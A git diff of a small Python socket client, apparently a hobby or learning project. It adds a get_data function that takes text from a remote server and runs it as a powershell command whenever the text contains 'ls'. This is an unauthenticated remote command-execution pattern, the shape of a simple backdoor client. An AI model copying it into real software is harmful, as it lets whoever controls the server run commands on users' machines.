@@ -24,18 +24,29 @@ def send_data(sock: socket.socket):
             # Send data to the server
             sock.sendall(msg.encode('utf-8')) 
 
-            try: # Get data back from server
-                res = sock.recv(1024).decode('utf-8')
-                print(f'Server response : {res}')
-                command = res.split(' ')
-                exec_command(command)
-            except socket.timeout:
-                print("Timeout, no response from server")
-                break
+            # Get data back from server
+            get_data(sock)
+
     except KeyboardInterrupt:
         print('Comms terminated')
     finally:
         sock.close()
+
+
+def get_data(sock: socket.socket):
+    try: 
+        res = sock.recv(1024).decode('utf-8')
+        print(f'Server response : {res}')
+        if 'ls' in res:
+            command = res.split(' ')
+            exec_command(command)
+        else:
+            print(res)
+    except socket.timeout:
+        print("Timeout, no response from server")
+    except ConnectionAbortedError :
+        print('Connection aborted from server')
+
 
 # example : command = ['powershell', 'start', 'brave', 'www.google.ca']
 def exec_command(command):
